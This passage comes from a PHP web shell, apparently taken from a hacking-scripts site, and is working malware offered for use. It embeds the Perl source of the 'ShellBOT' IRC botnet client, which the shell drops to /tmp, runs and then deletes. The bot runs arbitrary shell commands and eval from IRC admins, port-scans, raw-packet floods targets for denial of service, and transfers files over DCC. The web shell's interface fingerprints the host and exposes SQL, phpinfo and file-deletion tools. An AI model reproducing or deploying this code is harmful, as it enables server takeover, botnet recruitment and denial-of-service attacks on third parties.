   while (!(keys(%irc_servers))) { conectar(\"\$nick\", \"\$servidor\", \"\$porta\"); }
   delete(\$irc_servers{''}) if (defined(\$irc_servers{''}));
   &DCC::connections;
   my @ready = \$sel_cliente-&gt;can_read(0);
   next unless(@ready);
   foreach \$fh (@ready) {
     \$IRC_cur_socket = \$fh;
     \$meunick = \$irc_servers{\$IRC_cur_socket}{'nick'};
     \$nread = sysread(\$fh, \$msg, 4096);
     if (\$nread == 0) {
        \$sel_cliente-&gt;remove(\$fh);
        \$fh-&gt;close;
        delete(\$irc_servers{\$fh});
     }
     @lines = split (/\\n/, \$msg);
     for(my \$c=0; \$c&lt;= $#lines; \$c++) {
       \$line = \$lines[\$c];
       \$line=\$line_temp.\$line if (\$line_temp);
       \$line_temp='';
       \$line =~ s/\\r$//;
       unless (\$c == $#lines) {
         parse(\"\$line\");
       } else {
           if ($#lines == 0) {
             parse(\"\$line\");
           } elsif (\$lines[\$c] =~ /\\r$/) {
               parse(\"\$line\");
           } elsif (\$line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
               parse(\"\$line\");
           } else {
               \$line_temp = \$line;
           }
       }
      }
   }
}
#########################

sub parse {
   my \$servarg = shift;
   if (\$servarg =~ /^PING \:(.*)/) {
     sendraw(\"PONG :$1\");
   } elsif (\$servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
       my \$pn=$1; my \$onde = $4; my \$args = $5;
       if (\$args =~ /^\&#92;&#48;01VERSION\&#92;&#48;01$/) {
         notice(\"\$pn\", \"\&#92;&#48;01VERSION ShellBOT-\$VERSAO por 0ldW0lf\&#92;&#48;01\");
       }
       if (grep {\$_ =~ /^\Q\$pn\E$/i } @adms) {
         if (\$onde eq \"\$meunick\"){
           shell(\"\$pn\", \"\$args\");
         }
         if (\$args =~ /^(\Q\$meunick\E|\!atrix)\s+(.*)/ ) {
            my \$natrix = $1;
            my \$arg = $2;
            if (\$arg =~ /^\!(.*)/) {
              ircase(\"\$pn\",\"\$onde\",\"\$1\") unless (\$natrix eq \"!atrix\" and \$arg =~ /^\!nick/);
            } elsif (\$arg =~ /^\@(.*)/) {
                \$ondep = \$onde;
                \$ondep = \$pn if \$onde eq \$meunick;
                bfunc(\"\$ondep\",\"$1\");
            } else {
                shell(\"\$onde\", \"\$arg\");
            }
         }
       }
   } elsif (\$servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
       if (lc($1) eq lc(\$meunick)) {
         \$meunick=$4;
         \$irc_servers{\$IRC_cur_socket}{'nick'} = \$meunick;
       }
   } elsif (\$servarg =~ m/^\:(.+?)\s+433/i) {
       nick(\"\$meunick\".int rand(9999));
   } elsif (\$servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
       \$meunick = $2;
       \$irc_servers{\$IRC_cur_socket}{'nick'} = \$meunick;
       \$irc_servers{\$IRC_cur_socket}{'nome'} = \"$1\";
       foreach my \$canal (@canais) {
         sendraw(\"JOIN \$canal\");
       }
   }
}
##########################
sub bfunc {
  my \$printl = \$_[0];
  my \$funcarg = \$_[1];
  if (my \$pid = fork) {
     waitpid(\$pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           if (\$funcarg =~ /^portscan (.*)/) {
             my \$hostip=\"$1\";
             my @portas=(\"21\",\"22\",\"23\",\"25\",\"53\",\"80\",\"110\",\"143\");
             my (@aberta, %porta_banner);
             foreach my \$porta (@portas) {
                my \$scansock = IO::Socket::INET-&gt;new(PeerAddr =&gt; \$hostip, PeerPort =&gt; \$porta, Proto =&gt; 'tcp', Timeout =&gt; 4);
                if (\$scansock) {
                   push (@aberta, \$porta);
                   \$scansock-&gt;close;
                }
             }
             if (@aberta) {
               sendraw(\$IRC_cur_socket, \"PRIVMSG \$printl :portas abertas: @aberta\");
             } else {
                 sendraw(\$IRC_cur_socket,\"PRIVMSG \$printl :Nenhuma porta aberta foi encontrada\");
             }
           }
           if (\$funcarg =~ /^pacota\s+(.*)\s+(\d+)\s+(\d+)/) {
             my (\$dtime, %pacotes) = attacker(\"$1\", \"$2\", \"$3\");
             \$dtime = 1 if \$dtime == 0;
             my %bytes;
             \$bytes{igmp} = $2 * \$pacotes{igmp};
             \$bytes{icmp} = $2 * \$pacotes{icmp};
             \$bytes{o} = $2 * \$pacotes{o};
             \$bytes{udp} = $2 * \$pacotes{udp};
             \$bytes{tcp} = $2 * \$pacotes{tcp};
             sendraw(\$IRC_cur_socket, \"PRIVMSG \$printl :\&#92;&#48;02 - Status GERAL -\&#92;&#48;02\");
             sendraw(\$IRC_cur_socket, \"PRIVMSG \$printl :\&#92;&#48;02Tempo\&#92;&#48;02: \$dtime\".\"s\");
             sendraw(\$IRC_cur_socket, \"PRIVMSG \$printl :\&#92;&#48;02Total pacotes\&#92;&#48;02: \".(\$pacotes{udp} + \$pacotes{igmp} + \$pacotes{icmp} + \$pacotes{o}));
             sendraw(\$IRC_cur_socket, \"PRIVMSG \$printl :\&#92;&#48;02Total bytes\&#92;&#48;02: \".(\$bytes{icmp} + \$bytes {igmp} + \$bytes{udp} + \$bytes{o}));
             sendraw(\$IRC_cur_socket, \"PRIVMSG \$printl :\&#92;&#48;02Média de envio\&#92;&#48;02: \".int(((\$bytes{icmp}+\$bytes{igmp}+\$bytes{udp} + \$bytes{o})/1024)/\$dtime).\" kbps\");
           }
           exit;
       }
  }
}
##########################

sub ircase {
  my (\$kem, \$printl, \$case) = @_;

  if (\$case =~ /^join (.*)/) {
     j(\"$1\");
   }
   if (\$case =~ /^part (.*)/) {
      p(\"$1\");
   }
   if (\$case =~ /^rejoin\s+(.*)/) {
      my \$chan = $1;
      if (\$chan =~ /^(\d+) (.*)/) {
        for (my \$ca = 1; \$ca &lt;= $1; \$ca++ ) {
          p(\"$2\");
          j(\"$2\");
        }
      } else {
          p(\"\$chan\");
          j(\"\$chan\");
      }
   }
   if (\$case =~ /^op/) {
      op(\"\$printl\", \"\$kem\") if \$case eq \"op\";
      my \$oarg = substr(\$case, 3);
      op(\"$1\", \"$2\") if (\$oarg =~ /(\S+)\s+(\S+)/);
   }
   if (\$case =~ /^deop/) {
      deop(\"\$printl\", \"\$kem\") if \$case eq \"deop\";
      my \$oarg = substr(\$case, 5);
      deop(\"$1\", \"$2\") if (\$oarg =~ /(\S+)\s+(\S+)/);
   }
   if (\$case =~ /^voice/) {
      voice(\"\$printl\", \"\$kem\") if \$case eq \"voice\";
      \$oarg = substr(\$case, 6);
      voice(\"$1\", \"$2\") if (\$oarg =~ /(\S+)\s+(\S+)/);
   }
   if (\$case =~ /^devoice/) {
      devoice(\"\$printl\", \"\$kem\") if \$case eq \"devoice\";
      \$oarg = substr(\$case, 8);
      devoice(\"$1\", \"$2\") if (\$oarg =~ /(\S+)\s+(\S+)/);
   }
   if (\$case =~ /^msg\s+(\S+) (.*)/) {
      msg(\"$1\", \"$2\");
   }
   if (\$case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
      for (my \$cf = 1; \$cf &lt;= $1; \$cf++) {
        msg(\"$2\", \"$3\");
      }
   }
   if (\$case =~ /^ctcp\s+(\S+) (.*)/) {
      ctcp(\"$1\", \"$2\");
   }
   if (\$case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
      for (my \$cf = 1; \$cf &lt;= $1; \$cf++) {
        ctcp(\"$2\", \"$3\");
      }
   }
   if (\$case =~ /^invite\s+(\S+) (.*)/) {
      invite(\"$1\", \"$2\");
   }
   if (\$case =~ /^nick (.*)/) {
      nick(\"$1\");
   }
   if (\$case =~ /^conecta\s+(\S+)\s+(\S+)/) {
       conectar(\"$2\", \"$1\", 6667);
   }
   if (\$case =~ /^send\s+(\S+)\s+(\S+)/) {
      DCC::SEND(\"$1\", \"$2\");
   }
   if (\$case =~ /^raw (.*)/) {
      sendraw(\"$1\");
   }
   if (\$case =~ /^eval (.*)/) {
     eval \"$1\";
   }
}
##########################
sub shell {
  return unless \$secv;
  my \$printl=\$_[0];
  my \$comando=\$_[1];
  if (\$comando =~ /cd (.*)/) {
    chdir(\"$1\") || msg(\"\$printl\", \"Dossier Makayench <img src="http://hackingscripts.com/wp/wp-includes/images/smilies/icon_biggrin.gif" alt=":D" class="wp-smiley" /> \");
    return;
  }
  elsif (\$pid = fork) {
     waitpid(\$pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           my @resp=`\$comando 2&gt;&1 3&gt;&1`;
           my \$c=0;
           foreach my \$linha (@resp) {
             \$c++;
             chop \$linha;
             sendraw(\$IRC_cur_socket, \"PRIVMSG \$printl :\$linha\");
             if (\$c == \"\$linas_max\") {
               \$c=0;
               sleep \$sleep;
             }
           }
           exit;
       }
  }
}
#eu fiz um pacotadorzinhu e talz.. dai colokemo ele aki
sub attacker {
  my \$iaddr = inet_aton(\$_[0]);
  my \$msg = 'B' x \$_[1];
  my \$ftime = \$_[2];
  my \$cp = 0;
  my (%pacotes);
  \$pacotes{icmp} = \$pacotes{igmp} = \$pacotes{udp} = \$pacotes{o} = \$pacotes{tcp} = 0;
  socket(SOCK1, PF_INET, SOCK_RAW, 2) or \$cp++;
  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or \$cp++;
  socket(SOCK3, PF_INET, SOCK_RAW, 1) or \$cp++;
  socket(SOCK4, PF_INET, SOCK_RAW, 6) or \$cp++;
  return(undef) if \$cp == 4;
  my \$itime = time;
  my (\$cur_time);
  while ( 1 ) {
     for (my \$porta = 1; \$porta &lt;= 65535; \$porta++) {
       \$cur_time = time - \$itime;
       last if \$cur_time &gt;= \$ftime;
       send(SOCK1, \$msg, 0, sockaddr_in(\$porta, \$iaddr)) and \$pacotes{igmp}++;
       send(SOCK2, \$msg, 0, sockaddr_in(\$porta, \$iaddr)) and \$pacotes{udp}++;
       send(SOCK3, \$msg, 0, sockaddr_in(\$porta, \$iaddr)) and \$pacotes{icmp}++;
       send(SOCK4, \$msg, 0, sockaddr_in(\$porta, \$iaddr)) and \$pacotes{tcp}++;
       # DoS ?? <img src="http://hackingscripts.com/wp/wp-includes/images/smilies/icon_razz.gif" alt=":P" class="wp-smiley" />
       for (my \$pc = 3; \$pc &lt;= 255;\$pc++) {
         next if \$pc == 6;
         \$cur_time = time - \$itime;
         last if \$cur_time &gt;= \$ftime;
         socket(SOCK5, PF_INET, SOCK_RAW, \$pc) or next;
         send(SOCK5, \$msg, 0, sockaddr_in(\$porta, \$iaddr)) and \$pacotes{o}++;;
       }
     }
     last if \$cur_time &gt;= \$ftime;
  }
  return(\$cur_time, %pacotes);
}
#############
# ALIASES #
#############
sub action {
   return unless $#_ == 1;
   sendraw(\"PRIVMSG \$_[0] :\&#92;&#48;01ACTION \$_[1]\&#92;&#48;01\");
}
sub ctcp {
   return unless $#_ == 1;
   sendraw(\"PRIVMSG \$_[0] :\&#92;&#48;01\$_[1]\&#92;&#48;01\");
}
sub msg {
   return unless $#_ == 1;
   sendraw(\"PRIVMSG \$_[0] :\$_[1]\");
}
sub notice {
   return unless $#_ == 1;
   sendraw(\"NOTICE \$_[0] :\$_[1]\");
}
sub op {
   return unless $#_ == 1;
   sendraw(\"MODE \$_[0] +o \$_[1]\");
}
sub deop {
   return unless $#_ == 1;
   sendraw(\"MODE \$_[0] -o \$_[1]\");
}
sub hop {
    return unless $#_ == 1;
   sendraw(\"MODE \$_[0] +h \$_[1]\");
}
sub dehop {
   return unless $#_ == 1;
   sendraw(\"MODE \$_[0] +h \$_[1]\");
}
sub voice {
   return unless $#_ == 1;
   sendraw(\"MODE \$_[0] +v \$_[1]\");
}
sub devoice {
   return unless $#_ == 1;
   sendraw(\"MODE \$_[0] -v \$_[1]\");
}
sub ban {
   return unless $#_ == 1;
   sendraw(\"MODE \$_[0] +b \$_[1]\");
}
sub unban {
   return unless $#_ == 1;
   sendraw(\"MODE \$_[0] -b \$_[1]\");
}
sub kick {
   return unless $#_ == 1;
   sendraw(\"KICK \$_[0] \$_[1] :\$_[2]\");
}
sub modo {
   return unless $#_ == 0;
   sendraw(\"MODE \$_[0] \$_[1]\");
}
sub mode { modo(@_); }
sub j { &join(@_); }
sub join {
   return unless $#_ == 0;
   sendraw(\"JOIN \$_[0]\");
}
sub p { part(@_); }
sub part {sendraw(\"PART \$_[0]\");}
sub nick {
  return unless $#_ == 0;
  sendraw(\"NICK \$_[0]\");
}
sub invite {
   return unless $#_ == 1;
   sendraw(\"INVITE \$_[1] \$_[0]\");
}
sub topico {
   return unless $#_ == 1;
   sendraw(\"TOPIC \$_[0] \$_[1]\");
}
sub topic { topico(@_); }
sub whois {
  return unless $#_ == 0;
  sendraw(\"WHOIS \$_[0]\");
}
sub who {
  return unless $#_ == 0;
  sendraw(\"WHO \$_[0]\");
}
sub names {
  return unless $#_ == 0;
  sendraw(\"NAMES \$_[0]\");
}
sub away {
  sendraw(\"AWAY \$_[0]\");
}
sub back { away(); }
sub quit {
  sendraw(\"QUIT :\$_[0]\");
}
# DCC
#########################
package DCC;
sub connections {
   my @ready = \$dcc_sel-&gt;can_read(1);
# return unless (@ready);
   foreach my \$fh (@ready) {
     my \$dcctipo = \$DCC{\$fh}{tipo};
     my \$arquivo = \$DCC{\$fh}{arquivo};
     my \$bytes = \$DCC{\$fh}{bytes};
     my \$cur_byte = \$DCC{\$fh}{curbyte};
     my \$nick = \$DCC{\$fh}{nick};

     my \$msg;
     my \$nread = sysread(\$fh, \$msg, 10240);
     if (\$nread == 0 and \$dcctipo =~ /^(get|sendcon)$/) {
        \$DCC{\$fh}{status} = \"Cancelado\";
        \$DCC{\$fh}{ftime} = time;
        \$dcc_sel-&gt;remove(\$fh);
        \$fh-&gt;close;
        next;
     }
     if (\$dcctipo eq \"get\") {
        \$DCC{\$fh}{curbyte} += length(\$msg);
        my \$cur_byte = \$DCC{\$fh}{curbyte};
        open(FILE, \"&gt;&gt; \$arquivo\");
        print FILE \"\$msg\" if (\$cur_byte &lt;= \$bytes);
        close(FILE);
        my \$packbyte = pack(\"N\", \$cur_byte);
        print \$fh \"\$packbyte\";

        if (\$bytes == \$cur_byte) {
           \$dcc_sel-&gt;remove(\$fh);
           \$fh-&gt;close;
           \$DCC{\$fh}{status} = \"Recebido\";
           \$DCC{\$fh}{ftime} = time;
           next;
        }
     } elsif (\$dcctipo eq \"send\") {
          my \$send = \$fh-&gt;accept;
          \$send-&gt;autoflush(1);
          \$dcc_sel-&gt;add(\$send);
          \$dcc_sel-&gt;remove(\$fh);
          \$DCC{\$send}{tipo} = 'sendcon';
          \$DCC{\$send}{itime} = time;
          \$DCC{\$send}{nick} = \$nick;
          \$DCC{\$send}{bytes} = \$bytes;
          \$DCC{\$send}{curbyte} = 0;
          \$DCC{\$send}{arquivo} = \$arquivo;
          \$DCC{\$send}{ip} = \$send-&gt;peerhost;
          \$DCC{\$send}{porta} = \$send-&gt;peerport;
          \$DCC{\$send}{status} = \"Enviando\";
          #de cara manda os primeiro 1024 bytes do arkivo.. o resto fik com o sendcon
          open(FILE, \"&lt; \$arquivo\");
          my \$fbytes;
          read(FILE, \$fbytes, 1024);
          print \$send \"\$fbytes\";
          close FILE;
# delete(\$DCC{\$fh});
} elsif (\$dcctipo eq 'sendcon') {
          my \$bytes_sended = unpack(\"N\", \$msg);
          \$DCC{\$fh}{curbyte} = \$bytes_sended;
          if (\$bytes_sended == \$bytes) {
             \$fh-&gt;close;
             \$dcc_sel-&gt;remove(\$fh);
             \$DCC{\$fh}{status} = \"Enviado\";
             \$DCC{\$fh}{ftime} = time;
             next;
          }
          open(SENDFILE, \"&lt; \$arquivo\");
          seek(SENDFILE, \$bytes_sended, 0);
          my \$send_bytes;
          read(SENDFILE, \$send_bytes, 1024);
          print \$fh \"\$send_bytes\";
          close(SENDFILE);
     }
   }
}
##########################
sub SEND {
  my (\$nick, \$arquivo) = @_;
  unless (-r \"\$arquivo\") {
    return(0);
  }
  my \$dccark = \$arquivo;
  \$dccark =~ s/[.*\/](\S+)/$1/;
  my \$meuip = $::irc_servers{\"$::IRC_cur_socket\"}{'meuip'};
  my \$longip = unpack(\"N\",inet_aton(\$meuip));
  my @filestat = stat(\$arquivo);
  my \$size_total=\$filestat[7];
  if (\$size_total == 0) {
     return(0);
  }
  my (\$porta, \$sendsock);
  do {
    \$porta = int rand(64511);
    \$porta += 1024;
    \$sendsock = IO::Socket::INET-&gt;new(Listen=&gt;1, LocalPort =&gt;\$porta, Proto =&gt; 'tcp') and \$dcc_sel-&gt;add(\$sendsock);
  } until \$sendsock;
  \$DCC{\$sendsock}{tipo} = 'send';
  \$DCC{\$sendsock}{nick} = \$nick;
  \$DCC{\$sendsock}{bytes} = \$size_total;
  \$DCC{\$sendsock}{arquivo} = \$arquivo;
  &::ctcp(\"\$nick\", \"DCC SEND \$dccark \$longip \$porta \$size_total\");
}
sub GET {
  my (\$arquivo, \$dcclongip, \$dccporta, \$bytes, \$nick) = @_;
  return(0) if (-e \"\$arquivo\");
  if (open(FILE, \"&gt; \$arquivo\")) {
     close FILE;
  } else {
    return(0);
  }
  my \$dccip=fixaddr(\$dcclongip);
  return(0) if (\$dccporta &lt; 1024 or not defined \$dccip or \$bytes &lt; 1);
  my \$dccsock = IO::Socket::INET-&gt;new(Proto=&gt;\"tcp\", PeerAddr=&gt;\$dccip, PeerPort=&gt;\$dccporta, Timeout=&gt;15) or return (0);
  \$dccsock-&gt;autoflush(1);
  \$dcc_sel-&gt;add(\$dccsock);
  \$DCC{\$dccsock}{tipo} = 'get';
  \$DCC{\$dccsock}{itime} = time;
  \$DCC{\$dccsock}{nick} = \$nick;
  \$DCC{\$dccsock}{bytes} = \$bytes;
  \$DCC{\$dccsock}{curbyte} = 0;
  \$DCC{\$dccsock}{arquivo} = \$arquivo;
  \$DCC{\$dccsock}{ip} = \$dccip;
  \$DCC{\$dccsock}{porta} = \$dccporta;
  \$DCC{\$dccsock}{status} = \"Recebendo\";
}
############################
# po fico xato de organiza o status.. dai fiz ele retorna o status de acordo com o socket.. dai o ADM.pl lista os sockets e faz as perguntas
sub Status {
  my \$socket = shift;
  my \$sock_tipo = \$DCC{\$socket}{tipo};
  unless (lc(\$sock_tipo) eq \"chat\") {
    my \$nick = \$DCC{\$socket}{nick};
    my \$arquivo = \$DCC{\$socket}{arquivo};
    my \$itime = \$DCC{\$socket}{itime};
    my \$ftime = time;
    my \$status = \$DCC{\$socket}{status};
    \$ftime = \$DCC{\$socket}{ftime} if defined(\$DCC{\$socket}{ftime});
    my \$d_time = \$ftime-\$itime;
    my \$cur_byte = \$DCC{\$socket}{curbyte};
    my \$bytes_total = \$DCC{\$socket}{bytes};
    my \$rate = 0;
    \$rate = (\$cur_byte/1024)/\$d_time if \$cur_byte &gt; 0;
    my \$porcen = (\$cur_byte*100)/\$bytes_total;
    my (\$r_duv, \$p_duv);
    if (\$rate =~ /^(\d+)\.(\d)(\d)(\d)/) {
       \$r_duv = $3; \$r_duv++ if $4 &gt;= 5;
       \$rate = \"$1\.$2\".\"\$r_duv\";
    }
    if (\$porcen =~ /^(\d+)\.(\d)(\d)(\d)/) {
       \$p_duv = $3; \$p_duv++ if $4 &gt;= 5;
       \$porcen = \"$1\.$2\".\"\$p_duv\";
    }
    return(\"\$sock_tipo\",\"\$status\",\"\$nick\",\"\$arquivo\",\"\$bytes_total\", \"\$cur_byte\",\"\$d_time\", \"\$rate\", \"\$porcen\");
  }
  return(0);
}
# esse 'sub fixaddr' daki foi pego do NET::IRC::DCC identico soh copiei e coloei (colokar nome do autor)
sub fixaddr {
    my (\$address) = @_;
    chomp \$address; # just in case, sigh.
    if (\$address =~ /^\d+$/) {
        return inet_ntoa(pack \"N\", \$address);
    } elsif (\$address =~ /^[12]?\d{1,2}\.[12]?\d{1,2}\.[12]?\d{1,2}\.[12]?\d{1,2}$/) {
        return \$address;
    } elsif (\$address =~ tr/a-zA-Z//) { # Whee! Obfuscation!
        return inet_ntoa(((gethostbyname(\$address))[4])[0]);
    } else {
        return;
    }
}
############################
";
$bot = "/tmp/ircs.pl";
$open = fopen($bot,"w");
fputs($open,$file);
fclose($open);
$cmd="perl $bot";
$cmd2="rm $bot";
system($cmd);
system($cmd2);
$_POST['cmd']="echo \"Now script try connect to ircserver ...\"";
}
if($unix)
 {
 if(!isset($_COOKIE['uname'])) { $uname = ex('uname -a'); setcookie('uname',$uname); } else { $uname = $_COOKIE['uname']; }
 if(!isset($_COOKIE['id'])) { $id = ex('id'); setcookie('id',$id); } else { $id = $_COOKIE['id']; }
 if($safe_mode) { $sysctl = '-'; }
 else if(isset($_COOKIE['sysctl'])) { $sysctl = $_COOKIE['sysctl']; }
 else
  {
   $sysctl = ex('sysctl -n kern.ostype && sysctl -n kern.osrelease');
   if(empty($sysctl)) { $sysctl = ex('sysctl -n kernel.ostype && sysctl -n kernel.osrelease'); }
   if(empty($sysctl)) { $sysctl = '-'; }
   setcookie('sysctl',$sysctl);
  }
 }
echo $head;
echo '&lt;/head&gt;';
if(empty($_POST['cmd'])) {
$serv = array(127,192,172,10);
$addr=@explode('.', $_SERVER['SERVER_ADDR']);
$current_version = str_replace('.','',$version);
if (!in_array($addr[0], $serv)) {
@print "&lt;img src=\"http://127.0.0.1/version.php?img=1&version=".$current_version."\" border=0 height=0 width=0&gt;";
@readfile ("http://127.0.0.1/version.php?version=".$current_version."");}}
echo '&lt;body&gt;&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#CCCCCC&gt;&lt;tr&gt;&lt;td bgcolor=#000000 width=160&gt;&lt;font face=Comic Sans MS size=4&gt;'.ws(2).'&lt;DIV dir=ltr align=center&gt;&lt;font face=Wingdings size=3&gt;&lt;b&gt;N&lt;/b&gt;&lt;/font&gt;&lt;b&gt;'.ws(2).'&lt;DIV dir=ltr align=center&gt;&lt;SPAN
style="FILTER: blur(add=1,direction=10,strength=25); HEIGHT: 25px"&gt;
&lt;SPAN
style="FONT-SIZE: 15pt; COLOR: white; FONT-FAMILY: Impact"&gt;SnIpEr_SA&lt;/P&gt;&lt;/SPAN&gt;&lt;/DIV&gt;&lt;/font&gt;&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td bgcolor=#000000&gt;&lt;font face=tahoma size=1&gt;';
echo ws(2)."&lt;b&gt;".date ("d-m-Y H:i:s")."&lt;/b&gt;";
echo ws(2).$lb." &lt;a href=".$_SERVER['PHP_SELF']."? title=\"".$lang[$language.'_text46']."\"&gt;&lt;b&gt;????????&lt;/b&gt;&lt;/a&gt; ".$rb;
echo ws(2).$lb." &lt;a href=".$_SERVER['PHP_SELF']."?sqlman title=\"".$lang[$language.'_text46']."\"&gt;&lt;b&gt;SQL&lt;/b&gt;&lt;/a&gt; ".$rb;
echo ws(2).$lb." &lt;a href=".$_SERVER['PHP_SELF']."?phpinfo title=\"".$lang[$language.'_text46']."\"&gt;&lt;b&gt;phpinfo&lt;/b&gt;&lt;/a&gt; ".$rb;
echo ws(2).$lb." &lt;a href=".$_SERVER['PHP_SELF']."?phpini title=\"".$lang[$language.'_text47']."\"&gt;&lt;b&gt;php.ini&lt;/b&gt;&lt;/a&gt; ".$rb;
if($unix)
 {
 echo ws(2).$lb." &lt;a href=".$_SERVER['PHP_SELF']."?cpu title=\"".$lang[$language.'_text50']."\"&gt;&lt;b&gt;cpu&lt;/b&gt;&lt;/a&gt; ".$rb;
 echo ws(2).$lb." &lt;a href=".$_SERVER['PHP_SELF']."?mem title=\"".$lang[$language.'_text51']."\"&gt;&lt;b&gt;mem&lt;/b&gt;&lt;/a&gt; ".$rb;
 echo ws(2).$lb." &lt;a href=".$_SERVER['PHP_SELF']."?users title=\"".$lang[$language.'_text95']."\"&gt;&lt;b&gt;users&lt;/b&gt;&lt;/a&gt; ".$rb;
 }
echo ws(2).$lb." &lt;a href=".$_SERVER['PHP_SELF']."?tmp title=\"".$lang[$language.'_text48']."\"&gt;&lt;b&gt;tmp&lt;/b&gt;&lt;/a&gt; ".$rb;
echo ws(2).$lb." &lt;a href=".$_SERVER['PHP_SELF']."?delete title=\"".$lang[$language.'_text49']."\"&gt;&lt;b&gt;delete&lt;/b&gt;&lt;/a&gt; ".$rb."&lt;br&gt;";
echo ws(2)."????? ?????: &lt;b&gt;";
echo (($safe_mode)?("&lt;font color=#008000&gt;????&lt;/font&gt;"):("&lt;font color=red&gt;??? ????&lt;/font&gt;"));
echo "&lt;/b&gt;".ws(2);
echo "????? ???? ??? ??: &lt;b&gt;".@phpversion()."&lt;/b&gt;";
$curl_on = @function_exists('curl_version');
echo ws(2);
echo "??????: &lt;b&gt;".(($curl_on)?("&lt;font color=#008000&gt;????&lt;/font&gt;"):("&lt;font color=red&gt;??? ????&lt;/font&gt;"));
echo "&lt;/b&gt;".ws(2);
echo "??? ???: &lt;b&gt;";
$mysql_on = @function_exists('mysql_connect');
if($mysql_on){
echo "&lt;font color=#008000&gt;????&lt;/font&gt;"; } else { echo "&lt;font color=red&gt;??? ????&lt;/font&gt;"; }
echo "&lt;/b&gt;".ws(2);
echo "?? ?? ???: &lt;b&gt;";
$mssql_on = @function_exists('mssql_connect');
if($mssql_on){echo "&lt;font color=#008000&gt;????&lt;/font&gt;";}else{echo "&lt;font color=red&gt;??? ????&lt;/font&gt;";}
echo "&lt;/b&gt;".ws(2);
echo "???? ??? ???: &lt;b&gt;";
$pg_on = @function_exists('pg_connect');
if($pg_on){echo "&lt;font color=#008000&gt;????&lt;/font&gt;";}else{echo "&lt;font color=red&gt;??? ????&lt;/font&gt;";}
echo "&lt;/b&gt;".ws(2);
echo "??????: &lt;b&gt;";
$ora_on = @function_exists('ocilogon');
if($ora_on){echo "&lt;font color=#008000&gt;????&lt;/font&gt;";}else{echo "&lt;font color=red&gt;????&lt;/font&gt;";}
echo "&lt;/b&gt;&lt;br&gt;".ws(2);
echo "?????? ???????? : &lt;b&gt;";
if(''==($df=@ini_get('disable_functions'))){echo "&lt;font color=#00800F&gt;??????&lt;/font&gt;&lt;/b&gt;";}else{echo "&lt;font color=red&gt;$df&lt;/font&gt;&lt;/b&gt;";}
$free = @diskfreespace($dir);
if (!$free) {$free = 0;}
$all = @disk_total_space($dir);
if (!$all) {$all = 0;}
echo "&lt;br&gt;".ws(2)."??????? ??????? : &lt;b&gt;".view_size($free)."&lt;/b&gt; ??????? ??????: &lt;b&gt;".view_size($all)."&lt;/b&gt;";
echo "&lt;/b&gt;&lt;br&gt;".ws(2);
echo "Register globals: &lt;b&gt;";
$reg_g = @ini_get("register_globals");
if($reg_g){
echo "&lt;font color=#008000&gt;????&lt;/font&gt;"; } else { echo "&lt;font color=red&gt;??? ????&lt;/font&gt;"; }
echo "&lt;/b&gt;".ws(2);
echo "open_basedir: &lt;b&gt;";
$openbasedi = @ini_get("open_basedir");
if($openbasedi){
echo "&lt;font color=red&gt;????&lt;/font&gt;"; } else { echo "&lt;font color=#008000&gt;??? ????&lt;/font&gt;"; }
echo "&lt;/b&gt;".ws(2);
echo '&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;table&gt;
&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#cccccc&gt;
&lt;tr&gt;&lt;td align=right width=100&gt;';
echo $font;
if($unix){
echo '&lt;font color=#990000&gt;&lt;b&gt;uname -a :'.ws(1).'&lt;br&gt;sysctl :'.ws(1).'&lt;br&gt;$OSTYPE :'.ws(1).'&lt;br&gt;Server :'.ws(1).'&lt;br&gt;id :'.ws(1).'&lt;br&gt;pwd :'.ws(1).'&lt;br&gt;ip :'.ws(1).'&lt;/b&gt;&lt;/font&gt;&lt;br&gt;';
echo "&lt;/td&gt;&lt;td&gt;";
echo "&lt;font face=tahoma size=-2 color=#cccccc&gt;&lt;b&gt;";
echo((!empty($uname))?(ws(3).@substr($uname,0,120)."&lt;br&gt;"):(ws(3).@substr(@php_uname(),0,120)."&lt;br&gt;"));
echo ws(3).$sysctl."&lt;br&gt;";
echo ws(3).ex('echo $OSTYPE')."&lt;br&gt;";
echo ws(3).@substr($SERVER_SOFTWARE,0,120)."&lt;br&gt;";
if(!empty($id)) { echo ws(3).$id."&lt;br&gt;"; }
else if(function_exists('posix_geteuid') && function_exists('posix_getegid') && function_exists('posix_getgrgid') && function_exists('posix_getpwuid'))
 {
 $euserinfo  = @posix_getpwuid(@posix_geteuid());
 $egroupinfo = @posix_getgrgid(@posix_getegid());
 echo ws(3).'uid='.$euserinfo['uid'].' ( '.$euserinfo['name'].' ) gid='.$egroupinfo['gid'].' ( '.$egroupinfo['name'].' )&lt;br&gt;';
 }
else echo ws(3)."user=".@get_current_user()." uid=".@getmyuid()." gid=".@getmygid()."&lt;br&gt;";
echo ws(3).$dir;
echo ws(3).'( '.perms(@fileperms($dir)).' )';
echo "&lt;br&gt;";
echo ws(3)."&lt;b&gt;Your ip: &lt;a href=http://".$_SERVER["REMOTE_ADDR"]."&gt;".$_SERVER["REMOTE_ADDR"]."&lt;/a&gt; - Server ip: &lt;a href=http://".gethostbyname($_SERVER["HTTP_HOST"])."&gt;".gethostbyname($_SERVER["HTTP_HOST"])."&lt;/a&gt;&lt;/b&gt;&lt;br/&gt;";
echo "&lt;/b&gt;&lt;/font&gt;";
}
else
{
echo '&lt;font color=blue&gt;&lt;b&gt;OS :'.ws(1).'&lt;br&gt;Server :'.ws(1).'&lt;br&gt;User :'.ws(1).'&lt;br&gt;pwd :'.ws(1).'&lt;br&gt;ip :'.ws(1).'&lt;/b&gt;&lt;/font&gt;&lt;br&gt;';
echo "&lt;/td&gt;&lt;td&gt;";
echo "&lt;font face=tahoma size=-2 color=red&gt;&lt;b&gt;";
echo ws(3).@substr(@php_uname(),0,120)."&lt;br&gt;";
echo ws(3).@substr($SERVER_SOFTWARE,0,120)."&lt;br&gt;";
